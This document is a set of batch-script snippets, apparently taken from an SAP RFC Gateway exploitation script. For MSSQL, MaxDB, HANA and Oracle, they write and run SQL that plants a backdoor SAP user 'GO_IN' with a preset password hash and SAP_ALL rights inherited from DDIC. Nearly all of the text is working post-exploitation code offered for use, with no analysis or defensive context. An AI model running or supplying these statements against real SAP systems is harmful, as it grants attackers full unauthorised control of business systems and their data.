# The below are code snippets extracted from an RFC Gateway exploitation script. Only interesting parts are the SQL statements for the different DB types 
# that directly create and OS user in the DB that you can then use to logon to SAP.
# For some DB types you can do direct updates, for others your first need to append/echo the SQL commands into a file and execute that afterwards.
# The SAP_ALL comes from the reference user DDIC.
# Password hash is for the password "andinyougo".

:: ##################################################################################################################################################
:: MSSQL PART
echo use %sid2% > a.sql
echo go >> a.sql
echo INSERT INTO %sid%.USR02 (MANDT,BNAME,USTYP,CODVN) VALUES ('%cli%','GO_IN','S','G') >> a.sql
echo go >> a.sql

:: ADD THE "UPDATE THE BCODE\PASSCODE" PART TO THE REMOTE SQL SCRIPT
echo UPDATE %sid%.USR02 set BCODE=0xC76AB3A59599FE3A where MANDT=%cli% and BNAME='GO_IN' >> a.sql
echo go >> a.sql
echo UPDATE %sid%.USR02 set PASSCODE=0xCF017A9A4F1F53ED69CEDC773072B1B24A063A63 where MANDT=%cli% and BNAME='GO_IN' >> a.sql
echo go >> a.sql

:: ADD THE "GIVE IT REFUSER DDIC (Which means SAP_ALL)" PART TO THE REMOTE SQL SCRIPT
echo INSERT INTO %sid%.USREFUS (MANDT,BNAME,REFUSER) VALUES ('%cli%','GO_IN','DDIC') >> a.sql
echo go >> a.sql

:: EXECUTE THE SCRIPT
sqlcmd -S %dbhost% -i a.sql



:: ##################################################################################################################################################
:: MAXDB PART
:Maxdb

sqlcli -U DEFAULT INSERT INTO USR02 (MANDT,BNAME,BCODE,USTYP,CODVN) VALUES ('%cli%','GO_IN','C76AB3A59599FE3A','S','G')
sqlcli -U DEFAULT UPDATE USR02 set PASSCODE='CF017A9A4F1F53ED69CEDC773072B1B24A063A63' where BNAME='GO_IN' and mandt='%cli%'
sqlcli -U DEFAULT INSERT INTO USREFUS (MANDT,BNAME,REFUSER) VALUES ('%cli%','GO_IN','DDIC')

goto End

:: ##################################################################################################################################################
:: HANA DB PART
:Hanadb

:: ADD THE "CREATE A USER" PART TO THE REMOTE SQL SCRIPT (This script is placed by default in the WORKdir)
echo INSERT INTO USR02 (MANDT,BNAME,USTYP,CODVN) VALUES ('%cli%','GO_IN','S','G') > a.sql
echo ; >> a.sql

:: ADD THE "UPDATE THE BCODE\PASSCODE" PART TO THE REMOTE SQL SCRIPT
echo UPDATE USR02 set BCODE='C76AB3A59599FE3A' where MANDT='%cli%' and BNAME='GO_IN' >> a.sql
echo ; >> a.sql
echo UPDATE USR02 set PASSCODE='CF017A9A4F1F53ED69CEDC773072B1B24A063A63' where MANDT='%cli%' and BNAME='GO_IN' >> a.sql
echo ; >> a.sql

:: ADD THE "GIVE IT REFUSER DDIC (Which means SAP_ALL)" PART TO THE REMOTE SQL SCRIPT
echo INSERT INTO USREFUS (MANDT,BNAME,REFUSER) VALUES ('%cli%','GO_IN','DDIC') >> a.sql
echo ; >> a.sql

:: EXECUTE THE SCRIPT
hdbsql -n %dbhost% -i 00 -U DEFAULT -o output.txt -I a.sql


goto End
:: ##################################################################################################################################################
:: ORACLE PART
:Oracle

:: CREATE THE SQL SCRIPT

echo connect / as sysdba; > a.sql
echo INSERT INTO SAPSR3.USR02 (MANDT,BNAME,BCODE,USTYP,CODVN) >> a.sql
echo VALUES ('%cli%','GO_IN','C76AB3A59599FE3A','S','G'); >> a.sql
echo UPDATE SAPSR3.USR02 set PASSCODE='CF017A9A4F1F53ED69CEDC773072B1B24A063A63' >> a.sql
echo where BNAME='GO_IN' and mandt='%cli%'; >> a.sql
echo INSERT INTO SAPSR3.USREFUS (MANDT,BNAME,REFUSER) VALUES ('%cli%','GO_IN','DDIC'); >> a.sql

:: EXECUTE THE SCRIPT
sqlplus -S /NOLOG @a.sql

